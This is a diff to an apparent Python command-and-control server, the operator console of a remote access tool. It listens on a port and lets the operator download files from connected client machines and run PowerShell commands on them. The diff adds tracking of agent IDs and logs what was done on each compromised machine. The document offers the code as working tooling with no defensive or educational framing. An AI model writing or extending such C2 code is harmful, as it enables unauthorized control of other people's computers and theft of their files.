@@ -1,5 +1,6 @@
 import socket
 import os
+from datetime import datetime
 
 
 def receive_file(client_socket, file_path):
@@ -30,6 +31,38 @@ def receive_file(client_socket, file_path):
         print(f"Error while receiving file: {e}")
 
 
+def track_agent_activity(agent_id, activity):
+    if agent_id not in online_agents:
+        online_agents[agent_id] = {'last_activity': None, 'activities': []}
+
+    online_agents[agent_id]['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    online_agents[agent_id]['activities'].append(activity)
+
+
+def update_online_agents(agent_id):
+    if agent_id not in online_agents:
+        online_agents[agent_id] = {'last_activity': None, 'activities': []}
+
+
+def view_online_agents():
+    print("Online Agents:")
+    for agent_id, agent_info in online_agents.items():
+        print(f"Agent ID: {agent_id}, Last Activity: {agent_info['last_activity']}")
+
+
+def view_agent_activities(agent_id):
+    if agent_id in online_agents:
+        print(f"Activities for Agent ID {agent_id}:")
+        for activity in online_agents[agent_id]['activities']:
+            print(activity)
+    else:
+        print(f"Agent ID {agent_id} not found.")
+
+
+# Initialize online_agents dictionary to store agent information
+online_agents = {}
+
+
 def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('0.0.0.0', 1234))
@@ -40,13 +73,20 @@ def main():
     client_socket, client_address = server.accept()
     print(f"Connection from {client_address}")
 
+    # Get Agent ID from the client
+    agent_id = client_socket.recv(4096).decode('utf-8')
+    update_online_agents(agent_id)
+
     while True:
-        choice = input("Enter your choice (1: Download File, 2: Access PowerShell, 3: Upload File, exit: Exit): ")
+        choice = input(
+            "Enter your choice (1: Download File, 2: Access PowerShell, 3: Upload File, 4: View Online Agents, "
+            "5: View Agent Activities, exit: Exit): ")
 
         if choice == '1':
             command = input("Enter the file path to download from the client: ")
             client_socket.send(f"get {command}".encode('utf-8'))
             receive_file(client_socket, command)
+            track_agent_activity(agent_id, f"Downloaded file: {command}")
         elif choice == '2':
             while True:
                 command = input("Enter command to execute on the client (type 'exit' to return to choice selection): ")
@@ -55,6 +95,13 @@ def main():
                 client_socket.send(command.encode('utf-8'))
                 output = client_socket.recv(4096).decode('utf-8')
                 print(output)
+                track_agent_activity(agent_id, f"Executed command: {command}")
+        elif choice == '3':
+            print("Not ready !!!")
+        elif choice == '4':
+            view_online_agents()
+        elif choice == '5':
+            view_agent_activities(agent_id)
         elif choice.lower() == 'exit':
             client_socket.send(choice.encode('utf-8'))
             break
